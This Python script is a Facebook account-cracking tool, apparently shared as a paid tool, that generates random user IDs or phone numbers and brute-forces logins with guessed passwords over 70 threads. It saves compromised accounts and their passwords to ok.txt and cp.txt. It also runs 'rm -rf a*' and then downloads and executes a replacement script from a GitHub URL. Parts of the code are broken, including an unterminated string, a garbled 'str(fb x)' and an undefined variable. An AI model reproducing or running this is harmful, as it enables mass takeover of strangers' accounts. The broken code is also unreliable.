#coding=utf

#DECODE BY RAJA RIND

import os,sys,time,json,random,re,string,platform,base64

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures==2 > /dev/null')

    os.system('python ali.py')

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

logo =  """   

    

_____             

 |  __ \      /\    

 | |__) |    /  \   

 |  _  /    / /\ \  

 | | \ \   / ____ \ 

 |_|  \_\ /_/    \_\

══════════════════════════════════════════════════

  Author       : RAJA RIND

  Brother      : JaWad

  TOOLS STATUS : paid

  Facebook      : راجا بلوچ

══════════════════════════════════════════════════"""

loop = 0

oks = []

cps = []

try:

    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')

    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()

    v = 3.1

    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text

    if str(v) in update:

        os.system('rm -rf a*')

        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')

        os.system('python ali.py')

    else:pass

except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

#global functions

def dynamic(text):

    titik = ['.   ','..  ','... ','.... ']

    for o in titik:

        print('\r'+text+o),

        sys.stdout.flush();time.sleep(1)

def raja():

    os.system('clear')

    print(logo)

    print('[1] Random crack')

    print(50*'-')

    opt = input('Choose option >>> ')

    if opt =='1':

        random_crack()

    else:

        print('\n\033[1;31mChoose valid option\033[0;97m')

def random_crack():

    os.system('clear')

    print(logo)

    print('[1] Random UID crack')

    print('[2] Random number crack')

    print('[B] Back')

    print(50*'-')

    opt = input('Choose option >>> ')

    if opt =='1':

        random_uid()

    elif opt =='2':

        random_number()

    elif opt =='3':

        main()

    else:

        print('\n\033[1;31mChoose valid option\033[0;97m')

def random_uid():

    user=[]

    os.system('clear')

    print(logo)

    limit = int(input('How many ids do you want to add ? '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(11))

        user.append('10000'+nmp)

    print('\n\033[1;33mExample: 123456,1234567,12345678 ... \033[0;97m')

    pwx = input('Put passwords: ').split(',')

    with ThreadPool(max_workers=70) as yaari:

        os.system('clear')

        print(logo)

        tl = str(len(user))

        print('Total ids: '+tl)

        print('The process has been started')

        print(50*'-')

        for uid in user:

            yaari.submit(rcrack,uid,pwx,tl)

    print(50*'-')

    print('Crack process has been completed')

    print('Ids saved in ok.txt,cp.txt')

    print(50*'-')

def random_number():

    user=[]

    os.system('clear')

    print(logo)

    print('\033[1;33mCode example: 92301,92302,92303,92344 .\033[0;97m')

    kode = input('Put code: ')

    limit = int(input('How many numbers do you want to add ? '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    with ThreadPool(max_workers=70) as yaari:

        os.system('clear')

        print(logo)

        tl = str(len(user))

        print('Total ids: '+tl)

        print('The process has been started')

        print(50*'-')

        for guru in user:

            uid = kode+guru

            pwx = [guru]

            yaari.submit(rcrack,uid,pwx,tl)

    print(50*'-')

    print('Crack process has been completed')

    print('Ids saved in ok.txt,cp.txt')

    print(50*'-')

def rcrack(uid,pwx,tl):

    #print(user)

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(proxy)

            session = requests.Session()

            x_fb = session.get('x.facebook.com).text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(x_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(x_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(x_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(fb x)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            headers = {

    'authority': 'x.facebook.com',

    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',

    'accept-language': 'en-US,en;q=0.9',

    # 'cookie': 'datr=Hmi9Y_uIrLbqpsP51t-Rt5pJ; sb=Hmi9Y1U06lkHGg4mbaeikQJ5; m_pixel_ratio=2; dnonce=AWl9iO0XFjNimYwQk7ZCJF3rvZFeC9qHImXZG5JaR7_1Z2FIDQZ4RnMuu8worT6Ed0CbClzZBjSvs5G8yR6a4lBj; wd=980x1851; fr=0oOxlX7m6nFUQjMKm..BjvWge.qp.AAA.0.0.BjvX4h.AWWJYNh-1bo',

    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',

    'sec-ch-ua-mobile': '?0',

    'sec-ch-ua-platform': '"Linux"',

    'sec-fetch-dest': 'document',

    'sec-fetch-mode': 'navigate',

    'sec-fetch-site': 'none',

    'sec-fetch-user': '?1',

    'upgrade-insecure-requests': '1',

    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',}

            lo = session.post('https://x.facebook.com/', cookies=cookies, headers=headers).text

            log_cookies=session.cookies.get_dict().keys()

            #print(iid+'|'+pws+'|'+str(log_cookies))

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[7:22]

                print('\033[1;32m[RAJA-OK] '+cid+' | '+ps+'\033[0;97m')

                open('ok.txt', 'a').write(cid+' | '+ps+'\n')

                oks.append(cid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[24:39]

                print('\033[1;31m[RAJA-CP] '+cid+' | '+ps+'\033[0;97m')

                open('cp.txt', 'a').write(cid+' | '+ps+'\n')

                cps.append(cid)

                break

            else:

                continue

        loop+=1

        sys.stdout.write('\r[%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),

        sys.stdout.flush()

    except:

        pass

raja()
